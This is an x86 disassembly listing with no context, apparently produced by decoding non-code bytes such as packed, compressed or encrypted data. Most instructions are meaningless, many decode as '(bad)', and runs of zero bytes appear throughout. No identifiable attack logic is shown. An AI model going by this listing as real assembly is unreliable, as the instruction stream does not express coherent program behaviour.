  41ff12:	hlt    
  41ff13:	jle    0x41fef6
  41ff15:	mov    cl,0xf7
  41ff17:	add    edx,DWORD PTR [ecx]
  41ff19:	fsub   QWORD PTR cs:[ebx]
  41ff1c:	nop
  41ff1d:	and    eax,0xd67b80fc
  41ff22:	fild   DWORD PTR [ebx]
  41ff24:	add    BYTE PTR [eax],al
  41ff26:	add    BYTE PTR [eax],al
  41ff28:	add    dh,cl
  41ff2a:	cmc    
  41ff2b:	rcl    DWORD PTR [ecx],cl
  41ff2d:	nop
  41ff2e:	es cld 
  41ff30:	jnp    0x41ff7d
  41ff32:	(bad)  
  41ff33:	leave  
  41ff34:	int    0xdc
  41ff36:	les    edi,FWORD PTR [ebx]
  41ff38:	adc    edx,DWORD PTR [eax-0x4e]
  41ff3b:	ja     0x41ff24
  41ff3d:	jae    0x41feff
  41ff3f:	test   DWORD PTR [ebx+edx*2-0x7128142a],0x4362f818
  41ff4a:	(bad)  
  41ff4b:	packsswb mm4,QWORD PTR [ebx]
  41ff4e:	(bad)  
  41ff4f:	(bad)  
  41ff50:	mov    ecx,0xf49bc4a4
  41ff55:	pop    edi
  41ff56:	mov    dl,0x51
  41ff58:	add    al,0xb
  41ff5a:	push   es
  41ff5b:	adc    al,0x14
  41ff5d:	sbb    DWORD PTR [edx+0x7f],edi
  41ff60:	ror    DWORD PTR [ebx+0x7fee8caa],1
  41ff66:	add    BYTE PTR [edx],dl
  41ff68:	clc    
  41ff69:	loop   0x41ff14
  41ff6b:	loop   0x41ff74
  41ff6d:	xor    edx,0xfffffff7
  41ff70:	pop    edx
  41ff71:	aas    
  41ff72:	stos   BYTE PTR es:[edi],al
  41ff73:	jecxz  0x41ff9c
  41ff75:	jl     0x41ff44
  41ff77:	push   cs
  41ff78:	test   eax,0x2598004c
  41ff7d:	js     0x41ffa1
  41ff7f:	out    dx,al
  41ff80:	cld    
  41ff81:	fstp   TBYTE PTR [ecx+0x2e13e94e]
  41ff87:	xor    edi,ebx
  41ff89:	xchg   ebx,eax
  41ff8a:	push   ds
  41ff8b:	add    bl,al
  41ff8d:	add    BYTE PTR [eax],al
  41ff8f:	add    BYTE PTR [eax],al
  41ff91:	add    BYTE PTR [ebx+0x740d62a7],dl
  41ff97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff98:	bound  eax,QWORD PTR ds:0xdcee006c
  41ff9e:	out    0xb9,eax
  41ffa0:	dec    esi
  41ffa1:	jmp    0xb980724c
  41ffa6:	cmc    
  41ffa7:	mov    dh,0x43
  41ffa9:	jno    0x41ff73
  41ffab:	aad    0x4a
  41ffad:	push   ss
  41ffae:	stc    
  41ffaf:	mov    ch,0x3
  41ffb1:	test   eax,0xcd6a3293
  41ffb6:	xlat   BYTE PTR ds:[ebx]
  41ffb7:	test   eax,0xb5edee62
  41ffbc:	inc    esp
  41ffbd:	sbb    edx,0x8e90eb2
  41ffc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffc4:	add    edi,ebp
  41ffc6:	enter  0xee9,0x3a
  41ffca:	and    DWORD PTR [esi],eax
  41ffcc:	xor    ebx,DWORD PTR [ecx]
  41ffce:	pop    es
  41ffcf:	ja     0x41ffc7
  41ffd1:	retf   
  41ffd2:	dec    esi
  41ffd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffd4:	in     eax,dx
  41ffd5:	push   ebx
  41ffd6:	mov    WORD PTR [edi-0xa52c2dd],fs
  41ffdc:	push   cs
  41ffdd:	mov    dh,0x98
  41ffdf:	or     eax,0x91942900
  41ffe4:	sub    ecx,0xaae4b293
  41ffea:	xchg   edi,eax
  41ffeb:	push   ds
  41ffec:	push   edi
  41ffed:	ins    BYTE PTR es:[edi],dx
  41ffee:	add    BYTE PTR ds:0x25f26413,ah
  41fff4:	sbb    al,BYTE PTR [eax]
  41fff6:	add    BYTE PTR [eax],al
  41fff8:	add    BYTE PTR [eax],al
  41fffa:	add    BYTE PTR [ebx-0x78aabc52],al
  420000:	adc    eax,0x7539ac01
  420005:	in     eax,dx
  420006:	mov    ch,BYTE PTR [ebp+0x396a02da]
  42000c:	inc    edx
  42000d:	inc    ecx
  42000e:	and    al,0xe9
  420010:	sbb    al,0xb6
  420012:	sti    
  420013:	ficom  WORD PTR [edi+edx*4]
  420016:	inc    esp
  420017:	xchg   ebp,eax
  420018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420019:	ja     0x420029
  42001b:	pop    es
  42001c:	popf   
  42001d:	add    al,BYTE PTR [ebx]
  42001f:	sub    DWORD PTR [ebp-0x5ecb00c2],esi
  420025:	add    BYTE PTR [eax-0x7],al
  420028:	aaa    
  420029:	pop    ecx
  42002a:	and    al,0x5
  42002c:	rol    bh,0x43
  42002f:	ins    BYTE PTR es:[edi],dx
  420030:	popa   
  420031:	xor    DWORD PTR [edx+edi*1],edi
  420034:	sbb    eax,0x149efb92
  420039:	test   DWORD PTR [esi-0x19],0x1f7415ee
  420040:	cmp    bh,al
  420042:	jne    0x420029
  420044:	cmp    edx,ebp
  420046:	je     0x41fffa
  420048:	xchg   esi,eax
  420049:	in     eax,dx
  42004a:	push   esi
  42004b:	test   BYTE PTR [edx+ebp*8+0x15],ch
  42004f:	or     eax,0x32002d9e
  420054:	mov    ds:0xae531431,al
  420059:	cdq    
  42005a:	push   esp
  42005b:	xchg   ebp,eax
  42005c:	outs   dx,BYTE PTR ds:[esi]
  42005d:	xchg   esi,eax
  42005e:	int    0x0
  420060:	add    BYTE PTR [eax],al
  420062:	add    BYTE PTR [eax],al
  420064:	shr    DWORD PTR [esi+eiz*8-0x1],0xde
  420069:	ss push ecx
  42006b:	and    al,0x61
  42006d:	xchg   esi,eax
  42006e:	in     eax,dx
  42006f:	push   ebp
  420070:	leave  
  420071:	adc    DWORD PTR [ecx],eax
  420073:	test   DWORD PTR fs:[ebp+ebp*8-0x7c],esi
  420078:	nop
  420079:	pop    ecx
  42007a:	lds    eax,FWORD PTR [ebx]
  42007c:	mov    ds:0x1b047b64,al
  420081:	pop    edi
  420082:	jnp    0x420031
  420084:	mov    ds:0xdcfcd354,eax
  420089:	jne    0x4200c4
  42008b:	push   esi
  42008c:	dec    edi
  42008d:	jg     0x4200b4
  42008f:	(bad)  
  420091:	cdq    
  420092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420093:	cld    
  420094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420095:	aad    0xe2
  420097:	aas    
  420098:	nop
  420099:	adc    edx,DWORD PTR [esi+eiz*8+0x1a]
  42009d:	imul   DWORD PTR [edi-0x4]
  4200a0:	push   ds
  4200a1:	xchg   edi,eax
  4200a2:	stc    
  4200a3:	imul   edx,esp,0xffffff99
  4200a6:	adc    eax,0x353e0b51
  4200ab:	or     BYTE PTR [esi+0x40],ah
  4200ae:	call   0xe853:0xc5a5ac7b
  4200b5:	jle    0x4200d2
  4200b7:	push   edi
  4200b9:	adc    eax,0xe5b7353
  4200be:	jo     0x420133
  4200c0:	dec    edi
  4200c1:	mov    al,0x5
  4200c3:	jl     0x42012e
  4200c5:	dec    ebp
  4200c6:	adc    ebp,edi
  4200c8:	add    BYTE PTR [eax],al
  4200ca:	add    BYTE PTR [eax],al
  4200cc:	add    BYTE PTR [ebp+0x41],bh
  4200cf:	loopne 0x420110
  4200d1:	nop
  4200d2:	adc    al,0x43
  4200d4:	cmp    BYTE PTR [esi+0x5e390605],0x8d
  4200db:	les    ebp,FWORD PTR [edi]
  4200dd:	sub    bl,cl
  4200df:	cld    
  4200e0:	inc    DWORD PTR [esi+0x78]
  4200e3:	in     al,0x5f
  4200e5:	jle    0x4200c0
  4200e7:	adc    cl,BYTE PTR [ecx+0x498a156]
  4200ed:	or     ebx,eax
  4200ef:	push   cs
  4200f0:	adc    DWORD PTR [ebp+eax*4-0x68],0x1b28c44
  4200f8:	hlt    
  4200f9:	or     dh,al
  4200fb:	sti    
  4200fc:	mov    bl,0xa
  4200fe:	out    dx,eax
  4200ff:	out    dx,eax
  420100:	mov    bl,0x77
  420102:	xlat   BYTE PTR ds:[ebx]
  420103:	sub    eax,0x3d3b9003
  420108:	or     al,0x56
  42010a:	mov    al,0xf6
  42010c:	ins    BYTE PTR es:[edi],dx
  42010d:	(bad)  
  42010e:	dec    DWORD PTR [eax]
  420110:	popa   
  420111:	mov    ds:0x47c3c42a,al
  420116:	or     dh,dl
  420118:	mov    esp,0x59f7ba51
  42011d:	xchg   edx,eax
  42011e:	sbb    dl,ah
  420120:	(bad)  
  420121:	das    
  420122:	mov    bl,0xa5
  420124:	mov    WORD PTR [ebx+0x70d7dfce],fs
  42012a:	call   0x437b:0xa7170a32
  420131:	add    BYTE PTR [eax],al
  420133:	add    BYTE PTR [eax],al
  420135:	add    BYTE PTR [ebx-0x7be9c334],al
  42013b:	sbb    DWORD PTR [ebx+eax*1-0xd304303],edi
  420142:	mov    bh,0xb2
  420144:	jp     0x420189
  420146:	arpl   WORD PTR [eax+eax*8-0x4e26c2d],di
  42014d:	adc    al,0xd0
  42014f:	icebp  
  420150:	add    BYTE PTR [edx*8+0x660fdc1d],cl
  420157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420158:	ret    0xa2cf
  42015b:	repnz idiv DWORD PTR [ebp-0x4708462f]
  420162:	or     BYTE PTR [esi+0x163809cd],dl
  420168:	xor    al,0x4
  42016a:	mov    WORD PTR [eax],es
  42016c:	or     eax,0x23ba1a8b
  420171:	pop    ss
  420172:	test   al,0x33
  420174:	push   cs
  420175:	loopne 0x42010b
  420177:	mov    dl,0x92
  420179:	test   eax,0xdcedd868
  42017e:	pop    edi
  42017f:	or     eax,0xc0d6e953
  420184:	inc    esi
  420185:	clc    
  420186:	push   ebx
  420187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420188:	cwde   
  420189:	cdq    
  42018a:	sbb    DWORD PTR [eax+0x247ae562],esp
  420190:	adc    esi,esp
  420192:	pop    esi
  420193:	mov    al,ds:0x21d3d953
  420198:	sbb    BYTE PTR [esi+0x0],ch
  42019b:	add    BYTE PTR [eax],al
  42019d:	add    BYTE PTR [eax],al
  42019f:	imul   edi,DWORD PTR [edx-0x4a7c0313],0xf00ae94e
  4201a9:	push   ss
  4201aa:	das    
  4201ab:	xchg   esi,eax
  4201ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201ad:	clc    
  4201ae:	fadd   st(6),st
  4201b0:	and    bh,bh
  4201b2:	inc    ebp
  4201b3:	cmp    DWORD PTR [edx+0x1a193e45],edi
  4201b9:	add    ebp,DWORD PTR [ecx-0x73b2f86d]
  4201bf:	push   ecx
  4201c0:	mov    ecx,0x1a891f0e
  4201c5:	jnp    0x42016c
  4201c7:	xchg   ebx,eax
  4201c8:	scas   al,BYTE PTR es:[edi]
  4201c9:	inc    esp
  4201ca:	(bad)  
  4201cb:	enter  0x16d1,0x95
  4201cf:	lods   eax,DWORD PTR ds:[esi]
  4201d0:	call   0x2992:0xb294f038
  4201d7:	mov    eax,0xefbcedc8
  4201dc:	or     al,0x53
  4201de:	jmp    0xf888c249
  4201e3:	shl    DWORD PTR [ebp-0x4720566e],cl
  4201e9:	sub    DWORD PTR [ecx-0x68],ebx
  4201ec:	and    DWORD PTR [edi],edx
  4201ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ef:	xchg   ebx,eax
  4201f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f1:	cwde   
  4201f2:	add    BYTE PTR [ecx-0x4a],ch
  4201f5:	test   DWORD PTR [edi],0x3401057f
  4201fb:	ins    BYTE PTR es:[edi],dx
  4201fc:	jno    0x4201eb
  4201fe:	pop    ebp
  4201ff:	cmp    ebp,DWORD PTR [ebp+0xf60e]
  420205:	add    BYTE PTR [eax],al
  420207:	add    BYTE PTR [ecx+ebx*4+0x79],ch
  42020b:	inc    esp
  42020c:	imul   ebp,DWORD PTR [ebp-0x257274bc],0x194f7416
  420216:	test   DWORD PTR [eax],0xc092b168
  42021c:	pop    ebp
  42021d:	mov    dl,0xeb
  42021f:	xor    eax,0x519645
  420224:	mov    dh,0xaa
  420226:	inc    ebp
  420227:	adc    ecx,ebp
  420229:	mov    al,0x91
  42022b:	rcr    BYTE PTR [ebp-0x3e],0x27
  42022f:	jo     0x42026e
  420231:	mov    dl,BYTE PTR ds:0x97ae39c6
  420237:	inc    eax
  420238:	and    DWORD PTR [eax],ebx
  42023a:	adc    edx,DWORD PTR [esi+0x56]
  42023d:	stos   BYTE PTR es:[edi],al
  42023e:	inc    ebp
  42023f:	adc    eax,0xc24cb139
  420244:	in     eax,dx
  420245:	mov    al,0xe4
  420247:	add    eax,0x519521
  42024c:	in     eax,dx
  42024d:	pop    esi
  42024e:	xchg   esi,eax
  42024f:	je     0x42022e
  420251:	mov    ah,0x62
  420253:	and    edx,DWORD PTR [ecx-0x16feeaab]
  420259:	sub    al,0xad
  42025b:	je     0x420250
  42025d:	add    esp,DWORD PTR [ecx]
  42025f:	jl     0x420271
  420261:	ins    DWORD PTR es:[edi],dx
  420262:	in     eax,dx
  420263:	(bad)  
  420264:	fsubr  QWORD PTR [eax+0x1c]
  420267:	inc    eax
  420268:	test   eax,0x74ad2b
  42026d:	add    BYTE PTR [eax],al
  42026f:	add    BYTE PTR [eax],al
  420271:	ret    
  420272:	leave  
  420273:	pop    esi
  420274:	or     BYTE PTR [eax-0x2fcee9fa],dl
  42027a:	fidiv  DWORD PTR [edi+0x8]
  42027d:	inc    esi
  42027e:	ins    BYTE PTR es:[edi],dx
  42027f:	(bad)  
  420280:	and    eax,DWORD PTR [esp+eiz*2-0x265ac41b]
  420287:	adc    bl,BYTE PTR [esi+0x52]
  42028a:	xchg   edx,eax
  42028b:	adc    DWORD PTR [ebx+0xb],edx
  42028e:	ds inc esp
  420290:	add    ch,al
  420292:	mov    ch,0xd6
  420294:	call   DWORD PTR [ebx-0x67a56818]
  42029a:	fadd   st(6),st
  42029c:	outs   dx,DWORD PTR ds:[esi]
  42029d:	push   0x57ff1ac3
  4202a2:	push   cs
  4202a3:	push   ebx
  4202a4:	jae    0x42025d
  4202a6:	sbb    al,0x6
  4202a8:	jl     0x420263
  4202aa:	int    0x12
  4202ac:	std    
  4202ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ae:	jno    0x420290
  4202b0:	aas    
  4202b1:	nop
  4202b2:	and    BYTE PTR [ebx-0x7e],cl
  4202b5:	das    
  4202b6:	xchg   BYTE PTR [eax+edi*1+0x4fc48dc7],ah
  4202bd:	adc    ebp,DWORD PTR [edi+0x1d]
  4202c0:	add    BYTE PTR [esp+edx*4+0x551d0ff7],bl
  4202c7:	sbb    eax,0x1d4f1550
  4202cc:	push   eax
  4202cd:	call   0xf841c021
  4202d2:	sbb    dh,cl
  4202d4:	sldt   WORD PTR [eax]
  4202d7:	add    BYTE PTR [eax],al
  4202d9:	add    BYTE PTR [eax-0x18a9c3bb],dl
  4202df:	cmp    al,0x19
  4202e1:	std    
  4202e2:	test   ebp,edx
  4202e4:	loop   0x420325
  4202e6:	nop
  4202e7:	aas    
  4202e8:	adc    ebp,edi
  4202ea:	inc    edi
  4202eb:	xchg   ecx,eax
  4202ec:	xchg   esi,eax
  4202ed:	out    dx,eax
  4202ee:	cmp    bh,BYTE PTR [ebp-0x62]
  4202f1:	cld    
  4202f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202f3:	mov    dl,0xfb
  4202f5:	div    BYTE PTR [edi-0x4e]
  4202f8:	les    edi,FWORD PTR [ebx]
  4202fa:	mov    BYTE PTR [edx+0x2d],dh
  4202fd:	pop    ebp
  4202fe:	sbb    al,0xba
  420300:	aaa    
  420301:	mov    edx,DWORD PTR [esi+eax*8-0x2c]
  420305:	test   bh,0xc2
  420308:	aaa    
  420309:	add    al,0xee
  42030b:	fbstp  TBYTE PTR [edi+0x37b18c45]
  420311:	imul   ecx,DWORD PTR [edx+0x74f40aa3],0x6cb0fc1d
  42031b:	mov    ebp,0xb2a7f80b
  420320:	cmp    al,0xb9
  420322:	mov    edx,0xc303e370
  420327:	aaa    
  420328:	fwait
  420329:	push   ebp
  42032a:	xchg   edx,eax
  42032b:	sbb    dl,BYTE PTR [eax+ecx*8]
  42032e:	inc    edi
  42032f:	scas   eax,DWORD PTR es:[edi]
  420330:	or     BYTE PTR [ecx-0x28534526],cl
  420336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420337:	call   0x437b:0xa32f0422
  42033e:	add    BYTE PTR [eax],al
  420340:	add    BYTE PTR [eax],al
  420342:	add    BYTE PTR [ebx-0x63e9a2f5],ah
  420348:	sbb    DWORD PTR [ebx+eax*1-0xd5042eb],edi
  42034f:	iret   
  420350:	mov    dl,0x70
  420352:	pop    ebx
  420353:	adc    ah,BYTE PTR [ebx+0x3b8b6a3]
  420359:	cld    
  42035a:	(bad)  
  42035b:	inc    edi
  42035c:	mov    ds:0x1aecfb84,eax
  420361:	in     al,dx
  420362:	pop    esp
  420363:	pop    esp
  420364:	ret    0xd41c
  420367:	mov    esp,DWORD PTR [ebx-0x432af096]
  42036d:	aaa    
  42036e:	repz (bad) 
  420370:	mov    dl,0xe
  420372:	push   0xffffffe6
  420374:	mov    dl,0xe
  420376:	jne    0x4203e6
  420378:	cld    
  420379:	in     eax,dx
  42037a:	pop    esi
  42037b:	test   BYTE PTR [ebp-0x1d5b5afd],ah
  420381:	push   cs
  420382:	inc    ebx
  420383:	mov    WORD PTR [ebp-0x6cf11e9b],fs
  420389:	js     0x420368
  42038b:	fisub  WORD PTR [ebp-0x1d7f1afd]
  420391:	push   cs
  420392:	mov    esi,0x17cebac4
  420397:	(bad)  [esi]
  420399:	pop    ss
  42039a:	sub    DWORD PTR ds:0x619e0af7,eax
  4203a0:	jp     0x4203a0
  4203a2:	sub    BYTE PTR [eax+eax*1+0xeb79],cl
  4203a9:	add    BYTE PTR [eax],al
  4203ab:	add    cl,dl
  4203ad:	mov    dh,0xf
  4203af:	and    edi,esp
  4203b1:	lods   al,BYTE PTR ds:[esi]
  4203b2:	in     eax,dx
  4203b3:	hlt    
  4203b4:	inc    ebx
  4203b5:	lahf   
  4203b6:	arpl   bp,sp
  4203b8:	(bad)  
  4203b9:	sahf   
  4203ba:	add    ebx,DWORD PTR [ecx]
  4203bc:	inc    ecx
  4203bd:	loop   0x4203cd
  4203bf:	(bad)  
  4203c0:	idiv   ah
  4203c2:	shr    ch,1
  4203c4:	xchg   ebx,eax
  4203c5:	and    ebx,edi
  4203c7:	inc    ecx
  4203c8:	nop
  4203c9:	mov    dl,0xe
  4203cb:	mov    ah,0xe1
  4203cd:	push   es
  4203ce:	call   0x1466:0x99797f40
  4203d5:	mov    eax,ds:0x6210e9ed
  4203da:	(bad)  
  4203db:	fiadd  DWORD PTR [edx+esi*8-0x13]
  4203df:	cld    
  4203e0:	out    0xc2,eax
  4203e2:	dec    esi
  4203e3:	jmp    0xe951b870
  4203e8:	xchg   ebx,eax
  4203e9:	scas   eax,DWORD PTR es:[edi]
  4203ea:	xchg   edx,eax
  4203eb:	(bad)  
  4203ec:	xchg   esp,eax
  4203ed:	mov    dl,0xe
  4203ef:	add    BYTE PTR [ebp+eax*2+0x69],bl
  4203f3:	add    DWORD PTR [ecx-0x6e31684b],edi
  4203f9:	ins    BYTE PTR es:[edi],dx
  4203fa:	sub    al,0x1
  4203fc:	test   eax,0xab24992a
  420401:	mov    eax,0xaac1000e
  420406:	dec    edi
  420407:	add    BYTE PTR [ecx-0x576d4ad6],bh
  42040d:	mov    ch,0xe
  42040f:	mov    eax,DWORD PTR [eax]
  420411:	add    BYTE PTR [eax],al
  420413:	add    BYTE PTR [eax],al
  420415:	fmul   QWORD PTR ds:0xb57858e5
  42041b:	xchg   ecx,eax
  42041c:	rol    cl,0x6f
  42041f:	ja     0x420435
  420421:	fdivr  QWORD PTR [ecx+0x31]
  420424:	and    al,0xb8
  420426:	inc    ax
  420428:	xor    edi,DWORD PTR [ecx]
  42042a:	gs pop ebp
  42042c:	jmp    DWORD PTR [ebp+edi*8-0x1]
  420430:	aas    
  420431:	imul   esi,DWORD PTR [edx],0xc81b7ead
  420437:	aad    0x66
  420439:	push   eax
  42043a:	jns    0x42048d
  42043c:	push   ds
  42043d:	inc    ebp
  42043e:	scas   eax,DWORD PTR es:[edi]
  42043f:	(bad)  
  420440:	clc    
  420441:	gs jp  0x420475
  420444:	data16 sar BYTE PTR [ecx+0x51],0x20
  420449:	mov    esp,0xe9203161
  42044e:	ds mov ecx,0x99b4f56c
  420454:	mov    WORD PTR [ebp-0x6001206],es
  42045a:	or     al,0x9f
  42045c:	pop    eax
  42045d:	mov    esi,0xdec090fc
  420462:	and    DWORD PTR [esi+0x1782a984],ebp
  420468:	xor    edi,DWORD PTR [ecx-0x6f7b6b6d]
  42046e:	outs   dx,DWORD PTR ds:[esi]
  42046f:	dec    ecx
  420470:	(bad)  
  420471:	fisttp WORD PTR [edx-0x746e1276]
  420477:	adc    DWORD PTR [ebx+0x0],ecx
  42047d:	add    BYTE PTR [edi+esi*2],dl
  420480:	adc    eax,DWORD PTR [ecx]
  420482:	nop
  420483:	mov    eax,DWORD PTR [edx+edx*8]
  420486:	or     BYTE PTR [ebx-0x2f],bh
  420489:	inc    esi
  42048a:	cmp    eax,0x48aa495
  42048f:	mov    bh,0x5e
  420491:	jmp    DWORD PTR [edi+0x498a888a]
  420497:	enter  0xe839,0x70
  42049b:	mov    ss,WORD PTR [eax]
  42049d:	add    bl,al
  42049f:	(bad)  
  4204a0:	cld    
  4204a1:	inc    ebx
  4204a2:	in     eax,0xbe
  4204a4:	mov    eax,ds:0xa2b5d48a
  4204a9:	dec    edi
  4204aa:	ja     0x42044b
  4204ac:	icebp  
  4204ad:	adc    eax,0xc39289d0
  4204b2:	xchg   esp,eax
  4204b3:	dec    eax
  4204b4:	mov    edi,0x2f160d0b
  4204b9:	xchg   esp,eax
  4204ba:	nop
  4204bb:	mov    DWORD PTR [ecx],edx
  4204bd:	xchg   DWORD PTR [ebp+esi*2+0x6dcc86d5],edi
  4204c4:	mov    ebp,0xe1b5a5fc
  4204c9:	aas    
  4204ca:	nop
  4204cb:	es iret 
  4204cd:	and    eax,DWORD PTR [eax+0x6c439459]
  4204d3:	push   ebp
  4204d4:	mov    eax,ds:0x8b672d30
  4204d9:	fisttp DWORD PTR [edx]
  4204db:	dec    edx
  4204dc:	adc    DWORD PTR [ebx-0xf149e4],ecx
  4204e2:	add    BYTE PTR [eax],al
  4204e4:	add    BYTE PTR [eax],al
  4204e6:	add    BYTE PTR [edi],al
  4204e8:	mov    bh,BYTE PTR [ecx+0xe]
  4204eb:	mov    edi,0xd083118a
  4204f0:	mov    dl,0x8a
  4204f2:	jmp    DWORD PTR [ecx+0x7a150072]
  4204f8:	ret    0xc072
  4204fb:	mov    bl,0xc6
  4204fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204fe:	mov    cl,0xef
  420500:	or     eax,DWORD PTR [edx+0x4]
  420503:	nop
  420504:	or     al,BYTE PTR [eax]
  420506:	add    eax,0xd0e4b290
  42050b:	mov    ebx,DWORD PTR [edi-0xd5f103e]
  420511:	idiv   DWORD PTR [esi-0x11]
  420514:	es jmp 0x3fee:0xc4e8a4ae
  42051c:	shl    DWORD PTR [edi],0x4
  42051f:	or     DWORD PTR [ecx-0x41],esi
  420522:	adc    eax,edx
  420524:	mov    cl,0xf7
  420526:	ins    BYTE PTR es:[edi],dx
  420527:	pop    eax
  420528:	(bad)  
  420529:	idiv   BYTE PTR [eax+0x3f76fddd]
  42052f:	outs   dx,DWORD PTR ds:[esi]
  420530:	mov    dh,0xf7
  420532:	add    edx,DWORD PTR [ecx+0x5]
  420535:	popa   
  420536:	adc    BYTE PTR [bp-0x7b81],dl
  42053b:	imul   edi,DWORD PTR [esi-0x5fa911d8],0xffffffca
  420542:	mul    DWORD PTR [eax+0x44b3f7f2]
  420548:	(bad)
  42054b:	add    BYTE PTR [eax],al
  42054d:	add    BYTE PTR [eax],al
  42054f:	add    BYTE PTR [edi-0x4e],bh
  420552:	jl     0x420562
  420554:	or     al,0x9
  420556:	mov    esp,0x7c52d03
  42055b:	cmc    
  42055c:	addr16 mov dl,0x8
  42055f:	cmp    eax,0x4a72ec28
  420564:	mov    ds:0xb3bf60fe,eax
  420569:	stos   BYTE PTR es:[edi],al
  42056a:	adc    bh,bh
  42056c:	xchg   DWORD PTR [ecx],ecx
  42056e:	shrd   DWORD PTR [ebx-0x2095d6dd],edx,cl
  420575:	rcr    BYTE PTR [edx],cl
  420577:	and    eax,0x71afe1de
  42057c:	cli    
  42057d:	repnz push cs
  42057f:	bound  ebp,QWORD PTR [edi]
  420581:	sar    esi,cl
  420583:	adc    BYTE PTR [edx-0x6c17fd4d],0xb2
  42058a:	ds inc eax
  42058c:	jmp    0x4205a5
  42058e:	push   ebx
  42058f:	jmp    0xef280bbf
  420594:	pop    edi
  420595:	sub    bl,BYTE PTR [ebx]
  420597:	jno    0x420556
  420599:	repnz push cs
  42059b:	jno    0x4205aa
  42059d:	ror    DWORD PTR [edi],cl
  42059f:	jmp    0x6565a337
  4205a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205a5:	repnz push cs
  4205a7:	mov    BYTE PTR [ecx-0x73d6fe32],0x3
  4205ae:	inc    edx
  4205af:	inc    ebx
  4205b0:	out    0x28,eax
  4205b2:	push   edx
  4205b3:	add    eax,0x0
  4205b8:	add    BYTE PTR [esi+ebp*8-0x13],bh
  4205bc:	cld    
  4205bd:	aas    
  4205be:	ror    DWORD PTR [esi-0x17],0x1a
  4205c2:	jbe    0x420555
  4205c4:	nop
  4205c5:	(bad)  
  4205c6:	and    BYTE PTR [edi-0x28cf2c26],ch
  4205cc:	idiv   BYTE PTR [edi-0x4e8db6a3]
  4205d2:	clc    
  4205d3:	shr    DWORD PTR [eax-0x58],1
  4205d6:	xor    DWORD PTR [esi],ecx
  4205d8:	jmp    0xbf860970
  4205dd:	(bad)  
  4205de:	sub    ah,al
  4205e0:	jb     0x4205a7
  4205e2:	sub    bl,ah
  4205e4:	inc    ecx
  4205e5:	mov    dl,0xf
  4205e7:	out    dx,al
  4205e8:	dec    esi
  4205e9:	(bad)  
  4205ea:	addr16 into 
  4205ec:	add    BYTE PTR [eax+0x21143172],al
  4205f2:	mov    eax,0xb734851b
  4205f7:	push   cs
  4205f8:	add    BYTE PTR [edx+esi*2+0x31],dl
  4205fc:	adc    BYTE PTR [ecx],ch
  4205fe:	push   eax
  4205ff:	jmp    0x6c00:0x2da2e515
  420606:	mul    BYTE PTR [ecx+0x27]
  420609:	jb     0x420658
  42060b:	pop    ecx
  42060c:	push   0xffffffbb
  42060e:	sub    dl,BYTE PTR [edx+0x50]
  420611:	sub    DWORD PTR [ebx],ebp
  420613:	push   ecx
  420614:	and    al,0xf9
  420616:	popa   
  420617:	jmp    0x4f:0x98a5cd74
  42061e:	add    BYTE PTR [eax],al
  420620:	add    BYTE PTR [eax],al
  420622:	jne    0x420632
  420624:	mov    al,0xae
  420626:	mov    eax,0x8d4c99b1
  42062b:	into   
  42062c:	div    BYTE PTR [ebp-0x75f14e3c]
  420632:	xor    DWORD PTR [eax],ecx
  420634:	adc    BYTE PTR [edx],dh
  420636:	xor    ch,BYTE PTR [eax]
  420638:	mov    ecx,0xeb1e124
  42063d:	add    ch,ch
  42063f:	fsub   DWORD PTR [ecx+0x4d]
  420642:	minps  xmm6,XMMWORD PTR [ecx]
  420645:	adc    al,0x69
  420647:	adc    BYTE PTR [ebx-0x1],0x7e
  42064b:	stos   BYTE PTR es:[edi],al
  42064c:	jmp    0x420663
  42064e:	lea    esp,[edi+0x2c46002d]
  420654:	pop    eax
  420655:	or     al,0x36
  420657:	sub    al,0x50
  420659:	or     al,ch
  42065b:	adc    eax,0xb3f10b1e
  420660:	mov    ds:0x1a663945,eax
  420665:	mov    bh,0xf4
  420667:	pushf  
  420668:	lods   al,BYTE PTR ds:[esi]
  420669:	loope  0x4205fb
  42066b:	fwait
  42066c:	sbb    al,cl
  42066e:	shr    esp,0xdc
  420671:	pop    es
  420672:	data16 hlt 
  420674:	fimul  WORD PTR [ebx-0x64]
  420677:	dec    ebx
  420678:	adc    DWORD PTR [ebx+0x69e05ed0],eax
  42067e:	ins    BYTE PTR es:[edi],dx
  42067f:	int3   
  420680:	fmul   QWORD PTR [ebx]
  420682:	out    dx,eax
  420683:	popf   
  420684:	std    
  420685:	adc    BYTE PTR [eax],al
  420687:	add    BYTE PTR [eax],al
  420689:	add    BYTE PTR [eax],al
  42068b:	push   eax
  42068c:	mov    ecx,DWORD PTR [esi-0x79f07041]
  420692:	call   edi
  420694:	mov    bl,BYTE PTR [eax+0x4638b8cc]
  42069a:	cld    
  42069b:	(bad)  
  42069c:	push   ss
  42069d:	push   edx
  42069e:	jae    0x4206c9
  4206a0:	adc    BYTE PTR [ebp-0x6184d5f1],ch
  4206a6:	add    al,BYTE PTR [edx+ecx*4-0x7cbfffef]
  4206ad:	cmp    eax,0x428b90a7
  4206b2:	je     0x420638
  4206b4:	ins    BYTE PTR es:[edi],dx
  4206b5:	std    
  4206b6:	arpl   WORD PTR [ecx-0x5a9ed37],sp
  4206bc:	pop    ebp
  4206bd:	inc    ebx
  4206be:	je     0x420648
  4206c0:	fs fwait
  4206c2:	xchg   DWORD PTR [ecx-0x7a02ee77],edx
  4206c8:	sub    esi,ebx
  4206ca:	aas    
  4206cb:	nop
  4206cc:	push   ss
  4206cd:	push   ebx
  4206ce:	jae    0x420669
  4206d0:	mov    cl,0x7a
